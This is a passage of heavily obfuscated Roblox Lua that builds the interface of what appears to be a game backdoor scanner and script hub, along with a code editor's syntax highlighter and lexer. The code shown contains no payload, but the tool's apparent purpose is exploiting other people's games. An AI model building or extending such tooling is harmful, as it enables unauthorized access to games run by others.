v0["6a"]['Position'] = UDim2.new(0 + 0, 130, 0, 0 + 0);
v0["6b"] = Instance.new("TextLabel", v0["63"]);
v0["6b"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 161 + 94);
v0["6b"]['TextSize'] = 1316 - (384 + 917);
v0["6b"]['TextColor3'] = Color3.fromRGB(233, 233, 930 - (128 + 569));
v0["6b"]['Size'] = UDim2.new(1543 - (1407 + 136), 1987 - (687 + 1200), 1710 - (556 + 1154), 70 - 50);
v0["6b"]['Text'] = [[- Backdoors: %d]];
v0["6b"]['Name'] = [[Backdoors]];
v0["6b"]['Font'] = Enum.Font.SourceSans;
v0["6b"]['BackgroundTransparency'] = 1;
v0["6b"]['Position'] = UDim2.new(95 - (9 + 86), 130, 421 - (275 + 146), 7 + 33);
v0["6c"] = Instance.new("TextLabel", v0["63"]);
v0["6c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6c"]['BackgroundColor3'] = Color3.fromRGB(319 - (29 + 35), 1130 - 875, 761 - 506);
v0["6c"]['TextSize'] = 66 - 51;
v0["6c"]['TextColor3'] = Color3.fromRGB(233, 233, 152 + 81);
v0["6c"]['Size'] = UDim2.new(0, 1112 - (53 + 959), 408 - (312 + 96), 20);
v0["6c"]['Text'] = [[- Scanned on: %s]];
v0["6c"]['Name'] = [[Date]];
v0["6c"]['Font'] = Enum.Font.SourceSans;
v0["6c"]['BackgroundTransparency'] = 1;
v0["6c"]['Position'] = UDim2.new(0, 130, 0, 104 - 44);
v0["6d"] = Instance.new("Frame", v0["63"]);
v0["6d"]['BackgroundColor3'] = Color3.fromRGB(285 - (147 + 138), 186, 977 - (813 + 86));
v0["6d"]['AnchorPoint'] = Vector2.new(1, 0 + 0);
v0["6d"]['Size'] = UDim2.new(0 - 0, 522 - (18 + 474), 1 + 0, 0 - 0);
v0["6d"]['Position'] = UDim2.new(1087 - (860 + 226), 303 - (121 + 182), 0, 0 + 0);
v0["6d"]['Name'] = [[Play]];
v0["6e"] = Instance.new("UICorner", v0["6d"]);
v0["6f"] = Instance.new("Frame", v0["6d"]);
v0["6f"]['BorderSizePixel'] = 1240 - (988 + 252);
v0["6f"]['BackgroundColor3'] = Color3.fromRGB(38, 5 + 33, 38);
v0["6f"]['Size'] = UDim2.new(0, 2 + 3, 1971 - (49 + 1921), 890 - (223 + 667));
v0["6f"]['Name'] = [[fix]];
v0["70"] = Instance.new("UIGradient", v0["6f"]);
v0["70"]['Rotation'] = 142 - (51 + 1);
v0["70"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0 - 0, Color3.fromRGB(168, 359 - 191, 1293 - (146 + 979))),ColorSequenceKeypoint.new(1, Color3.fromRGB(860 - (311 + 294), 711 - 456, 109 + 146))});
v0["71"] = Instance.new("ImageLabel", v0["6d"]);
v0["71"]['BackgroundColor3'] = Color3.fromRGB(1698 - (496 + 947), 255, 255);
v0["71"]['AnchorPoint'] = Vector2.new(1358.5 - (1233 + 125), 0.5 + 0);
v0["71"]['Image'] = [[rbxassetid://7008236803]];
v0["71"]['Size'] = UDim2.new(0, 14 + 1, 0 + 0, 1660 - (963 + 682));
v0["71"]['Name'] = [[Icon]];
v0["71"]['BackgroundTransparency'] = 1;
v0["71"]['Position'] = UDim2.new(0.5 + 0, 1507 - (504 + 1000), 0.5 + 0, 0 + 0);
v0["72"] = Instance.new("TextButton", v0["6d"]);
v0["72"]['TextSize'] = 2 + 12;
v0["72"]['TextTransparency'] = 1;
v0["72"]['BackgroundColor3'] = Color3.fromRGB(255, 376 - 121, 218 + 37);
v0["72"]['TextColor3'] = Color3.fromRGB(0, 0 + 0, 182 - (156 + 26));
v0["72"]['Size'] = UDim2.new(1 + 0, 0 - 0, 165 - (149 + 15), 960 - (890 + 70));
v0["72"]['Name'] = [[Hitbox]];
v0["72"]['Text'] = [[]];
v0["72"]['Font'] = Enum.Font.SourceSans;
v0["72"]['BackgroundTransparency'] = 118 - (39 + 78);
v0["73"] = Instance.new("TextLabel", v0["61"]);
v0["73"]['TextWrapped'] = true;
v0["73"]['BackgroundColor3'] = Color3.fromRGB(737 - (14 + 468), 560 - 305, 255);
v0["73"]['TextSize'] = 50 - 32;
v0["73"]['TextColor3'] = Color3.fromRGB(8 + 7, 140, 131 + 86);
v0["73"]['Size'] = UDim2.new(1 + 0, 0, 0 + 0, 14 + 36);
v0["73"]['Text'] = [[Scan games and save here all successfully scanned ones!]];
v0["73"]['Name'] = [[info]];
v0["73"]['Font'] = Enum.Font.Nunito;
v0["73"]['BackgroundTransparency'] = 1 - 0;
v0["74"] = Instance.new("ImageLabel", v0["23"]);
v0["74"]['ZIndex'] = 2;
v0["74"]['SliceCenter'] = Rect.new(99 + 1, 100, 351 - 251, 3 + 97);
v0["74"]['ScaleType'] = Enum.ScaleType.Slice;
v0["74"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 51 - (12 + 39));
v0["74"]['ImageColor3'] = Color3.fromRGB(0 + 0, 0 - 0, 0);
v0["74"]['SliceScale'] = 0.029999999329447746;
v0["74"]['Visible'] = false;
v0["74"]['Image'] = [[rbxassetid://3570695787]];
v0["74"]['Size'] = UDim2.new(3 - 2, 0, 1 + 0, 0 + 0);
v0["74"]['Name'] = [[Settings]];
v0["74"]['BackgroundTransparency'] = 1;
v0["74"]['Position'] = UDim2.new(0, 0 - 0, -0.003000000026077032, 0);
v0["75"] = Instance.new("Folder", v0["74"]);
v0["75"]['Name'] = [[Borders]];
v0["76"] = Instance.new("Frame", v0["75"]);
v0["76"]['BorderSizePixel'] = 0;
v0["76"]['BackgroundColor3'] = Color3.fromRGB(0 + 0, 0 - 0, 1710 - (1596 + 114));
v0["76"]['Size'] = UDim2.new(0 - 0, 9, 0, 1026 - (164 + 549));
v0["76"]['Position'] = UDim2.new(-(1438.00000009137 - (1059 + 379)), 0, 0, 0 - 0);
v0["77"] = Instance.new("Frame", v0["75"]);
v0["77"]['BorderSizePixel'] = 0 + 0;
v0["77"]['BackgroundColor3'] = Color3.fromRGB(0 + 0, 392 - (145 + 247), 0 + 0);
v0["77"]['Size'] = UDim2.new(0 + 0, 663, 0, 6);
v0["77"]['Position'] = UDim2.new(-4.5963965e-8, 0 - 0, 0 + 0, 0 + 0);
v0["78"] = Instance.new("Frame", v0["74"]);
v0["78"]['ZIndex'] = 2 - 0;
v0["78"]['BackgroundColor3'] = Color3.fromRGB(975 - (254 + 466), 255, 815 - (544 + 16));
v0["78"]['AnchorPoint'] = Vector2.new(0.5 - 0, 628.5 - (294 + 334));
v0["78"]['BackgroundTransparency'] = 1;
v0["78"]['LayoutOrder'] = 258 - (236 + 17);
v0["78"]['Size'] = UDim2.new(1, 0 + 0, 1 + 0, 0 - 0);
v0["78"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["78"]['Name'] = [[InnerBody]];
v0["79"] = Instance.new("TextLabel", v0["78"]);
v0["79"]['BackgroundColor3'] = Color3.fromRGB(1207 - 952, 132 + 123, 211 + 44);
v0["79"]['TextSize'] = 817 - (413 + 381);
v0["79"]['TextColor3'] = Color3.fromRGB(233, 10 + 223, 233);
v0["79"]['Size'] = UDim2.new(0 - 0, 259 - 159, 1970 - (582 + 1388), 68 - 28);
v0["79"]['Text'] = [[Settings]];
v0["79"]['Name'] = [[Title]];
v0["79"]['Font'] = Enum.Font.SourceSansBold;
v0["79"]['BackgroundTransparency'] = 1;
v0["7a"] = Instance.new("ScrollingFrame", v0["78"]);
v0["7a"]['Active'] = true;
v0["7a"]['BorderSizePixel'] = 0;
v0["7a"]['CanvasSize'] = UDim2.new(0 + 0, 364 - (326 + 38), 0 - 0, 0 - 0);
v0["7a"]['BackgroundColor3'] = Color3.fromRGB(255, 875 - (47 + 573), 90 + 165);
v0["7a"]['BackgroundTransparency'] = 4 - 3;
v0["7a"]['Size'] = UDim2.new(1, 0 - 0, 1, -(1707 - (1269 + 395)));
v0["7a"]['ScrollBarImageColor3'] = Color3.fromRGB(660 - (76 + 416), 168, 611 - (319 + 124));
v0["7a"]['ScrollBarThickness'] = 5;
v0["7a"]['Position'] = UDim2.new(0, 0 - 0, 1007 - (564 + 443), 118 - 75);
v0["7b"] = Instance.new("UIListLayout", v0["7a"]);
v0["7b"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["7b"]['Padding'] = UDim.new(0, 463 - (337 + 121));
v0["7b"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["7c"] = Instance.new("Frame", v0["7a"]);
v0["7c"]['BackgroundColor3'] = Color3.fromRGB(111 - 73, 126 - 88, 1949 - (1261 + 650));
v0["7c"]['AnchorPoint'] = Vector2.new(1 + 0, 0 - 0);
v0["7c"]['BackgroundTransparency'] = 1818 - (772 + 1045);
v0["7c"]['Size'] = UDim2.new(1 + 0, -(194 - (102 + 42)), 0, 25);
v0["7c"]['Name'] = [[dummy]];
v0["7d"] = Instance.new("UICorner", v0["7c"]);
v0["7e"] = Instance.new("TextLabel", v0["7c"]);
v0["7e"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["7e"]['BackgroundColor3'] = Color3.fromRGB(2099 - (1524 + 320), 1525 - (1049 + 221), 411 - (18 + 138));
v0["7e"]['TextSize'] = 43 - 25;
v0["7e"]['TextColor3'] = Color3.fromRGB(1335 - (67 + 1035), 581 - (136 + 212), 233);
v0["7e"]['AnchorPoint'] = Vector2.new(0 - 0, 0.5 + 0);
v0["7e"]['Size'] = UDim2.new(0, 93 + 7, 1605 - (240 + 1364), 1082 - (1050 + 32));
v0["7e"]['Text'] = [[Name]];
v0["7e"]['Name'] = [[Title]];
v0["7e"]['Font'] = Enum.Font.SourceSans;
v0["7e"]['BackgroundTransparency'] = 3 - 2;
v0["7e"]['Position'] = UDim2.new(0, 0, 0.5 + 0, 0);
v0["7f"] = Instance.new("LocalScript", v0["74"]);
v0["7f"]['Name'] = [[handler]];
v0["80"] = Instance.new("LocalScript", v0["2"]);
v0["80"]['Name'] = [[drag]];
v0["81"] = Instance.new("TextButton", v0["2"]);
v0["81"]['Active'] = false;
v0["81"]['TextSize'] = 1069 - (331 + 724);
v0["81"]['TextTransparency'] = 1 + 0;
v0["81"]['BackgroundColor3'] = Color3.fromRGB(199, 199, 843 - (269 + 375));
v0["81"]['TextColor3'] = Color3.fromRGB(0, 725 - (267 + 458), 0 + 0);
v0["81"]['AnchorPoint'] = Vector2.new(1 - 0, 1);
v0["81"]['Size'] = UDim2.new(818 - (667 + 151), 10, 1497 - (1410 + 87), 1907 - (1504 + 393));
v0["81"]['Name'] = [[Resize]];
v0["81"]['Font'] = Enum.Font.SourceSans;
v0["81"]['Position'] = UDim2.new(1, 0, 1, 0);
v0["82"] = Instance.new("UICorner", v0["81"]);
v0["82"]['CornerRadius'] = UDim.new(0, 5 - 3);
v0["83"] = Instance.new("LocalScript", v0["81"]);
v0["83"]['Name'] = [[handler]];
v0["84"] = Instance.new("TextButton", v0["2"]);
v0["84"]['ZIndex'] = 3;
v0["84"]['BorderSizePixel'] = 0;
v0["84"]['AutoButtonColor'] = false;
v0["84"]['TextSize'] = 14;
v0["84"]['TextTransparency'] = 2 - 1;
v0["84"]['BackgroundColor3'] = Color3.fromRGB(0, 796 - (461 + 335), 0);
v0["84"]['TextColor3'] = Color3.fromRGB(0 + 0, 0, 1761 - (1730 + 31));
v0["84"]['Visible'] = false;
v0["84"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["84"]['Size'] = UDim2.new(1667 - (728 + 939), 190, 0, 130);
v0["84"]['Name'] = [[SavePopup]];
v0["84"]['BorderColor3'] = Color3.fromRGB(0 - 0, 0, 0 - 0);
v0["84"]['Text'] = [[]];
v0["84"]['Font'] = Enum.Font.SourceSans;
v0["84"]['Position'] = UDim2.new(0.5 - 0, 1068 - (138 + 930), 0.5, 0);
v0["85"] = Instance.new("UICorner", v0["84"]);
v0["86"] = Instance.new("LocalScript", v0["84"]);
v0["86"]['Name'] = [[handler]];
v0["87"] = Instance.new("ImageLabel", v0["84"]);
v0["87"]['BackgroundColor3'] = Color3.fromRGB(234 + 21, 200 + 55, 219 + 36);
v0["87"]['ImageColor3'] = Color3.fromRGB(34, 138 - 104, 1800 - (459 + 1307));
v0["87"]['AnchorPoint'] = Vector2.new(1871 - (474 + 1396), 0);
v0["87"]['Image'] = [[rbxassetid://4467776646]];
v0["87"]['Size'] = UDim2.new(0, 18, 0 - 0, 18);
v0["87"]['BackgroundTransparency'] = 1 + 0;
v0["87"]['Position'] = UDim2.new(1 + 0, -5, 0 - 0, 1 + 4);
v0["88"] = Instance.new("TextButton", v0["87"]);
v0["88"]['TextSize'] = 46 - 32;
v0["88"]['TextTransparency'] = 4 - 3;
v0["88"]['BackgroundColor3'] = Color3.fromRGB(846 - (562 + 29), 218 + 37, 255);
v0["88"]['TextColor3'] = Color3.fromRGB(0, 1419 - (374 + 1045), 0 + 0);
v0["88"]['Size'] = UDim2.new(2 - 1, 638 - (448 + 190), 1 + 0, 0);
v0["88"]['Name'] = [[Hitbox]];
v0["88"]['Text'] = [[]];
v0["88"]['Font'] = Enum.Font.SourceSans;
v0["88"]['BackgroundTransparency'] = 1 + 0;
v0["89"] = Instance.new("ImageLabel", v0["87"]);
v0["89"]['BackgroundColor3'] = Color3.fromRGB(167 + 88, 255, 255);
v0["89"]['ImageColor3'] = Color3.fromRGB(171, 657 - 486, 531 - 360);
v0["89"]['AnchorPoint'] = Vector2.new(1494.5 - (1307 + 187), 0.5);
v0["89"]['Image'] = [[rbxassetid://3754291346]];
v0["89"]['Size'] = UDim2.new(1, -2, 3 - 2, -(4 - 2));
v0["89"]['Name'] = [[icon]];
v0["89"]['BackgroundTransparency'] = 2 - 1;
v0["89"]['Position'] = UDim2.new(683.5 - (232 + 451), 0 + 0, 0.5, 0 + 0);
v0["8a"] = Instance.new("ModuleScript", v0["87"]);
v0["8a"]['Name'] = [[toggler]];
v0["8b"] = Instance.new("TextLabel", v0["84"]);
v0["8b"]['BackgroundColor3'] = Color3.fromRGB(255, 819 - (510 + 54), 513 - 258);
v0["8b"]['TextSize'] = 59 - (13 + 23);
v0["8b"]['TextColor3'] = Color3.fromRGB(453 - 220, 333 - 100, 233);
v0["8b"]['Size'] = UDim2.new(0 - 0, 1168 - (830 + 258), 0 - 0, 26 + 14);
v0["8b"]['Text'] = [[Save]];
v0["8b"]['Name'] = [[Title]];
v0["8b"]['Font'] = Enum.Font.SourceSansBold;
v0["8b"]['BackgroundTransparency'] = 1;
v0["8c"] = Instance.new("ModuleScript", v0["1"]);
v0["8c"]['Name'] = [[utils]];
v0["8d"] = Instance.new("ModuleScript", v0["1"]);
v0["8d"]['Name'] = [[main]];
v0["8e"] = Instance.new("LocalScript", v0["1"]);
v0["8e"]['Name'] = [[intro]];
v0["8f"] = Instance.new("ModuleScript", v0["1"]);
v0["8f"]['Name'] = [[scripthub]];
v0["90"] = Instance.new("ModuleScript", v0["8f"]);
v0["90"]['Name'] = [[scripts]];
v0["91"] = Instance.new("ModuleScript", v0["1"]);
v0["91"]['Name'] = [[games]];
v0["92"] = Instance.new("ModuleScript", v0["1"]);
v0["92"]['Name'] = [[config]];
v0["93"] = Instance.new("ModuleScript", v0["1"]);
v0["93"]['Name'] = [[editor]];
v0["94"] = Instance.new("ModuleScript", v0["1"]);
v0["94"]['Name'] = [[magnolia]];
v0["95"] = Instance.new("LocalScript", v0["1"]);
v0["95"]['Name'] = [[secure]];
local v1158 = require;
local v1159 = {};
local function v1160(v1190)
	local v1191 = v1159[v1190];
	if v1191 then
		local v1659 = 0 + 0;
		while true do
			if (v1659 == (1441 - (860 + 581))) then
				if not v1191.Required then
					v1191.Required = true;
					v1191.Value = v1191.Closure();
				end
				return v1191.Value;
			end
		end
	end
	return v1158(v1190);
end
v1159[v0["9"]] = {Closure=function()
	local v1192 = 0 - 0;
	local v1193;
	local v1194;
	local v1195;
	local v1196;
	local v1197;
	while true do
		if (v1192 == 2) then
			v1197 = nil;
			function v1197(v2738)
				local v2739 = 0 + 0;
				while true do
					if (v2739 == (241 - (237 + 4))) then
						if (v2738 == nil) then
							v2738 = not v1196.Visible;
						end
						v1196.Visible = v2738;
						break;
					end
				end
			end
			v1192 = 6 - 3;
		end
		if (v1192 == (2 - 1)) then
			v1195 = game:GetService("UserInputService");
			v1196 = v1193.Parent.Parent.Parent.Parent.Parent.Main;
			v1192 = 3 - 1;
		end
		if (v1192 == (4 + 0)) then
			v1194.toggle = v1197;
			return v1194;
		end
		if (v1192 == (0 + 0)) then
			v1193 = v0["9"];
			v1194 = {keyBind=Enum.KeyCode.Home};
			v1192 = 1;
		end
		if (v1192 == (11 - 8)) then
			v1195.InputBegan:Connect(function(v2740, v2741)
				if v2741 then
					return;
				end
				if (v2740.KeyCode == v1194.keyBind) then
					v1197();
				end
			end);
			v1193.Parent.Hitbox.MouseButton1Click:Connect(v1197);
			v1192 = 4;
		end
	end
end};
v1159[v0["2f"]] = {Closure=function()
	local v1198 = v0["2f"];
	local v1199 = game:GetService("TextService");
	local v1200 = v1198.Parent.ScrollingFrame;
	local v1201 = v1200.SourceBox;
	local v1202 = v1200.Lines;
	local v1203 = v1160(v1198.Parent.Parent.Parent.Parent.Parent.Parent.Parent.config);
	local v1204 = v1160(v1198:WaitForChild("highlight"));
	v1204.UpdateColors(v1203.data.settings.codeColors);
	v1203.configSaved:Connect(function()
		v1204.UpdateColors(v1203.data.settings.codeColors);
	end);
	local v1205 = {};
	local v1206 = {};
	local v1207 = v1201:GetPropertyChangedSignal("Text");
	local function v1208(v1511)
		local v1512 = 0 + 0;
		local v1513;
		local v1514;
		while true do
			if (v1512 == 0) then
				v1513, v1514 = v1511:gsub("\n", "");
				return v1514;
			end
		end
	end
	local v1209 = function()
	end;
	local function v1210()
		local v1515 = v1201.Text;
		v1209();
		v1209 = v1204.Highlight(v1201, v1201.Text);
		local v1516 = "";
		for v1660 = 0, v1208(v1515) do
			v1516 = v1516 .. (v1660 + 1) .. "\n";
		end
		v1202.TextSize = v1201.TextSize;
		v1202.Font = v1201.Font;
		v1202.Text = v1516;
		local v1522 = v1199:GetTextSize(v1515, v1201.TextSize, v1201.Font, Vector2.new());
		v1200.CanvasSize = UDim2.new(0, v1522.X + v1201.TextSize + 14 + 10, 0, v1522.Y + v1201.TextSize);
	end
	task.spawn(function()
		while v1201.Parent do
			local v1661 = 1426 - (85 + 1341);
			while true do
				if (v1661 == (0 - 0)) then
					v1207:Wait();
					v1210();
					break;
				end
			end
		end
	end);
	return {colors=v1204.TokenColors};
end};
v1159[v0["30"]] = {Closure=function()
	local v1211 = v0["30"];
	local v1212 = v1160(v1211.lexer);
	local v1213 = v1160(v1211.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.config).codeColors;
	local v1214 = game:GetService("TextService");
	local v1215 = table.create(22 - 14);
	local v1216 = table.create(379 - (45 + 327));
	local v1217 = table.create(5 - 2);
	local function v1218(v1524)
		return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(v1524, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '\"', "&quot;"), "'", "&apos;");
	end
	local function v1219(v1525)
		return string.gsub(v1525, "\t", "	");
	end
	local function v1220(v1526)
		return string.gsub(v1526, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "");
	end
	local function v1221(v1527, v1528)
		v1528 = v1219(v1220(v1528 or v1527.Text));
		v1527.RichText = false;
		v1527.Text = v1528;
		v1527.TextXAlignment = Enum.TextXAlignment.Left;
		v1527.TextYAlignment = Enum.TextYAlignment.Top;
		v1527.BackgroundColor3 = v1215.background;
		v1527.TextColor3 = v1215.iden;
		v1527.TextTransparency = 0.5;
		local v1540 = v1527.TextSize;
		local v1541, v1542 = string.gsub(v1528, "\n", "");
		v1542 += 1
		local v1543 = v1214:GetTextSize("", v1527.TextSize, v1527.Font, Vector2.new());
		local v1544 = v1217[v1527];
		if not v1544 then
			local v2468 = 502 - (444 + 58);
			while true do
				if (v2468 == 0) then
					v1544 = table.create(v1542);
					for v3253 = 1 + 0, v1542 do
						local v3254 = Instance.new("TextLabel");
						v3254.Name = "Line_" .. v3253;
						v3254.RichText = true;
						v3254.BackgroundTransparency = 1;
						v3254.TextXAlignment = Enum.TextXAlignment.Left;
						v3254.TextYAlignment = Enum.TextYAlignment.Top;
						v3254.TextColor3 = v1215.iden;
						v3254.Font = v1527.Font;
						v3254.TextSize = v1540;
						v3254.Size = UDim2.new(1 + 0, 0, 0, v1543.Y);
						v3254.Position = UDim2.fromOffset(0, v1543.Y * v1527.LineHeight * (v3253 - (1 + 0)));
						v3254.Text = "";
						v3254.Parent = v1527;
						v1544[v3253] = v3254;
					end
					break;
				end
			end
		elseif (#v1544 < v1542) then
			for v3085 = #v1544 + (2 - 1), v1542 do
				local v3086 = Instance.new("TextLabel");
				v3086.Name = "Line_" .. v3085;
				v3086.RichText = true;
				v3086.BackgroundTransparency = 1733 - (64 + 1668);
				v3086.TextXAlignment = Enum.TextXAlignment.Left;
				v3086.TextYAlignment = Enum.TextYAlignment.Top;
				v3086.TextColor3 = v1215.iden;
				v3086.Font = v1527.Font;
				v3086.TextSize = v1540;
				v3086.Size = UDim2.new(1974 - (1227 + 746), 0 - 0, 0 - 0, v1543.Y);
				v3086.Position = UDim2.fromOffset(494 - (415 + 79), v1543.Y * v1527.LineHeight * (v3085 - 1));
				v3086.Text = "";
				v3086.Parent = v1527;
				v1544[v3085] = v3086;
			end
		elseif (#v1544 > v1542) then
			for v3368 = #v1544, v1542, -(1 + 0) do
				v1544[v3368].Text = "";
			end
		end
		local v1545, v1546, v1547 = {}, 0, 492 - (142 + 349);
		for v1662, v1663 in v1212.scan(v1528) do
			local v1664 = 0 + 0;
			local v1665;
			local v1666;
			while true do
				if (v1664 == (1 - 0)) then
					for v3104, v3105 in ipairs(v1666) do
						if (v3104 > (1 + 0)) then
							v1544[v1547].Text = table.concat(v1545);
							v1547 += 1
							v1546 = 0 + 0;
							table.clear(v1545);
						end
						v1546 += (2 - 1)
						if ((v1665 ~= v1215.iden) and string.find(v3105, "[%S%C]")) then
							v1545[v1546] = string.format(v1216[v1662], v3105);
						else
							v1545[v1546] = v3105;
						end
					end
					break;
				end
				if (v1664 == (1864 - (1710 + 154))) then
					v1665 = v1215[v1662] or v1215.iden;
					v1666 = string.split(v1218(v1663), "\n");
					v1664 = 1;
				end
			end
		end
		v1544[v1547].Text = table.concat(v1545);
		v1217[v1527] = v1544;
		local v1550;
		v1550 = v1527.AncestryChanged:Connect(function()
			local v1667 = 318 - (200 + 118);
			while true do
				if (v1667 == (0 + 0)) then
					if v1527.Parent then
						return;
					end
					v1217[v1527] = nil;
					v1667 = 1 - 0;
				end
				if (1 == v1667) then
					v1550:Disconnect();
					break;
				end
			end
		end);
		return function()
			local v1668 = 0;
			while true do
				if (v1668 == (0 - 0)) then
					for v3106, v3107 in ipairs(v1544) do
						v3107:Destroy();
					end
					table.clear(v1544);
					v1668 = 1 + 0;
				end
				if (v1668 == 1) then
					v1217[v1527] = nil;
					v1550:Disconnect();
					break;
				end
			end
		end;
	end
	local function v1222(v1551)
		local v1552 = 0 + 0;
		while true do
			if (v1552 == 3) then
				v1215.comment = (v1551 and v1551.comment) or Color3.fromRGB(140, 140, 155);
				v1215.operator = (v1551 and v1551.operator) or Color3.fromRGB(137 + 118, 239, 24 + 124);
				v1552 = 4;
			end
			if (v1552 == (4 - 2)) then
				v1215.string = (v1551 and v1551.string) or Color3.fromRGB(1446 - (363 + 887), 445 - 190, 918 - 725);
				v1215.number = (v1551 and v1551.number) or Color3.fromRGB(40 + 215, 292 - 167, 125);
				v1552 = 3 + 0;
			end
			if (v1552 == 1) then
				v1215.keyword = (v1551 and v1551.keyword) or Color3.fromRGB(215, 1838 - (674 + 990), 255);
				v1215.builtin = (v1551 and v1551.builtin) or Color3.fromRGB(38 + 93, 85 + 121, 403 - 148);
				v1552 = 1057 - (507 + 548);
			end
			if (v1552 == (841 - (289 + 548))) then
				for v2874, v2875 in pairs(v1215) do
					v1216[v2874] = '<font color="#' .. string.format("%.2x%.2x%.2x", v2875.R * (2073 - (821 + 997)), v2875.G * (510 - (195 + 60)), v2875.B * (69 + 186)) .. '">%s</font>';
				end
				for v2877, v2878 in pairs(v1217) do
					local v2879 = 0;
					while true do
						if (v2879 == 0) then
							for v3439, v3440 in ipairs(v2878) do
								v3440.TextColor3 = v1215.iden;
							end
							v1221(v2877);
							break;
						end
					end
				end
				break;
			end
			if (v1552 == (1501 - (251 + 1250))) then
				v1215.background = (v1551 and v1551.background) or Color3.fromRGB(47, 137 - 90, 33 + 14);
				v1215.iden = (v1551 and v1551.iden) or Color3.fromRGB(1266 - (809 + 223), 340 - 106, 702 - 468);
				v1552 = 3 - 2;
			end
		end
	end
	pcall(v1222);
	return setmetatable({UpdateColors=v1222,Highlight=v1221}, {__call=function(v1553, v1554, v1555)
		return v1221(v1554, v1555);
	end});
end};
v1159[v0["31"]] = {Closure=function()
	local v1223 = v0["31"];
	local v1224 = {};
	local v1225, v1226, v1227 = "^[%c%s]*", "[%c%s]*", "[%c%s]+";
	local v1228 = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+";
	local v1229 = "0x[%da-fA-F]+";
	local v1230 = "%d+%.?%d*[eE][%+%-]?%d+";
	local v1231 = "%d+[%._]?[%d_eE]*";
	local v1232 = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+";
	local v1233 = "[%[%]]+";
	local v1234 = "[%a_][%w_]*";
	local v1235 = '([\'\"])%1';
	local v1236 = '([\'\"])[^\n]-([^\\]%1)';
	local v1237 = '([\'\"]).-\n';
	local v1238 = '([\'\"])[^\n]*';
	local v1239 = "%[(=*)%[.-%]%1%]";
	local v1240 = "%[=*%[.-.*";
	local v1241 = "%-%-%[(=*)%[.-%]%1%]";
	local v1242 = "%-%-%[=*%[.-.*";
	local v1243 = "%-%-.-\n";
	local v1244 = "%-%-.*";
	local v1245 = v1160(v1223.language);
	local v1246 = v1245.keyword;
	local v1247 = v1245.builtin;
	local v1248 = v1245.libraries;
	local v1249 = {{(v1225 .. v1234 .. v1226),"var"},{(v1225 .. v1229 .. v1226),"number"},{(v1225 .. v1230 .. v1226),"number"},{(v1225 .. v1231 .. v1226),"number"},{(v1225 .. v1235 .. v1226),"string"},{(v1225 .. v1236 .. v1226),"string"},{(v1225 .. v1237 .. v1226),"string"},{(v1225 .. v1238 .. v1226),"string"},{(v1225 .. v1239 .. v1226),"string"},{(v1225 .. v1240 .. v1226),"string"},{(v1225 .. v1241 .. v1226),"comment"},{(v1225 .. v1242 .. v1226),"comment"},{(v1225 .. v1243 .. v1226),"comment"},{(v1225 .. v1244 .. v1226),"comment"},{(v1225 .. v1232 .. v1226),"operator"},{(v1225 .. v1233 .. v1226),"operator"},{(v1225 .. v1228 .. v1226),"iden"},{"^.","iden"}};
	v1224.scan = function(v1556)
		local v1557 = 0 - 0;
		local v1558;
		local v1559;
		local v1560;
		local v1561;
		local v1562;
		local v1563;
		while true do
			if ((7 - 5) == v1557) then
				return function()
					if (v1558 <= v1559) then
						for v3373, v3374 in ipairs(v1249) do
							local v3375, v3376 = string.find(v1556, v3374[1307 - (913 + 393)], v1558);
							if v3375 then
								local v3479 = string.sub(v1556, v3375, v3376);
								v1558 = v3376 + 1;
								v1224.finished = v1558 > v1559;
								local v3481 = v3374[5 - 3];
								local v3482 = v3481;
								if (v3481 == "var") then
									local v3541 = 0;
									local v3542;
									while true do
										if (0 == v3541) then
											v3542 = string.gsub(v3479, v1227, "");
											if v1246[v3542] then
												v3482 = "keyword";
											elseif v1247[v3542] then
												v3482 = "builtin";
											else
												v3482 = "iden";
											end
											v3541 = 1 - 0;
										end
										if (v3541 == 1) then
											if (string.find(v1560, "%.[%s%c]*$") and (v1563 ~= "comment")) then
												local v3582 = string.gsub(v1561, v1227, "");
												local v3583 = v1248[v3582];
												if (v3583 and v3583[v3542] and not string.find(v1562, "%.[%s%c]*$")) then
													v3482 = "builtin";
												else
													v3482 = "iden";
												end
											end
											break;
										end
									end
								end
								v1562 = v1561;
								v1561 = v1560;
								v1560 = v3479;
								v1563 = v3482;
								return v3482, v3479;
							end
						end
					end
				end;
			end
			if (v1557 == (410 - (269 + 141))) then
				v1224.finished = false;
				v1558 = 2 - 1;
				v1557 = 1982 - (362 + 1619);
			end
			if ((1626 - (950 + 675)) == v1557) then
				v1559 = #v1556;
				v1560, v1561, v1562, v1563 = "", "", "", "";
				v1557 = 1 + 1;
			end
		end
	end;
	v1224.navigator = function()
		local v1564 = {Source="",TokenCache=table.create(50),_RealIndex=0,_UserIndex=(1179 - (216 + 963)),_ScanThread=nil};
		v1564.Destroy = function(v1669)
			local v1670 = 1287 - (485 + 802);
			while true do
				if (v1670 == 1) then
					v1669._UserIndex = nil;
					v1669.TokenCache = nil;
					v1670 = 561 - (432 + 127);
				end
				if (v1670 == 2) then
					v1669._ScanThread = nil;
					break;
				end
				if (v1670 == 0) then
					v1669.Source = nil;
					v1669._RealIndex = nil;
					v1670 = 1;
				end
			end
		end;
		v1564.SetSource = function(v1671, v1672)
			local v1673 = 0;
			while true do
				if ((1074 - (1065 + 8)) == v1673) then
					v1671._UserIndex = 0 + 0;
					table.clear(v1671.TokenCache);
					v1673 = 1603 - (635 + 966);
				end
				if (v1673 == (0 + 0)) then
					v1671.Source = v1672;
					v1671._RealIndex = 42 - (5 + 37);
					v1673 = 2 - 1;
				end
				if (v1673 == 2) then
					v1671._ScanThread = coroutine.create(function()
						for v3272, v3273 in v1224.scan(v1671.Source) do
							local v3274 = 0 + 0;
							while true do
